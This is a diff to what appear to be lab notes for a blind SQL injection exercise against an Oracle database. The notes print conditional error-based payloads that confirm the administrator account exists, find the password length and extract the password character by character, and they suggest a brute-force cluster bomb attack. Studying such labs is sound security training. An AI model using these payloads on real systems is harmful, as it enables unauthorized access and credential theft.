@@ -30,22 +30,22 @@ Analysis:
 
 ' || (select '' from users where username='administrator') ||'
 
-' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
 
-' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||'
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||'
 - internal server error => administrator user exists
 
-' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='kjshdkjshdksjd') ||'
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='kjshdkjshdksjd') ||'
 - 200 response => user does not exists in database
 
 4) Determine length of password
 
-' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password) > 50) ||'
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password) > 50) ||'
 - 200 response at 50 > length of password is less than 50
 - password length is 20 characters
 
 5) Output the administrator password
 
-' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, 2, 1)='a') ||'
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, 2, 1)='a') ||'
 - a is not the first character of the password
 - use includer cluster bomb attack with payload #1 numbers and payload #2 bruteforce then filter 500 code response
